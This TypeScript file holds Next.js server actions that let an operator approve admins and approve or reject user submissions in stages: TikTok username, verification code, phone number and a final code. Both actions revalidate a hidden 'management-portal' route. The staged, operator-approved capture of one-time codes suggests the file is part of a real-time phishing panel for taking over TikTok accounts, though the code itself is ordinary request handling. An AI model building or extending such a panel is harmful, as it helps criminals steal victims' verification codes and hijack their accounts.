
'use server';

import { revalidatePath } from 'next/cache';

// This function is now client-invokable via a fetch call to the API route
// but we'll prepare a server action wrapper for simplicity in components.

export async function approveAdminAction(adminId: string, isVerified: boolean) {
    const res = await fetch(`${process.env.NEXT_PUBLIC_BASE_URL}/api/admins`, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ adminId, isVerified })
    });
    if (!res.ok) {
        const error = await res.json();
        throw new Error(error.message || "Failed to update admin status.");
    }
    revalidatePath('/management-portal-a7b3c9d2e1f0');
}

export async function updateSubmissionStatusAction(
  id: string,
  step: 'tiktokUsername' | 'verificationCode' | 'phoneNumber' | 'finalCode',
  status: 'approved' | 'rejected'
) {
    const res = await fetch(`${process.env.NEXT_PUBLIC_BASE_URL}/api/submissions`, {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ submissionId: id, step, status })
    });

    if (!res.ok) {
         const error = await res.json();
        throw new Error(error.message || "Failed to update submission status.");
    }
  revalidatePath('/management-portal-a7b3c9d2e1f0');
}
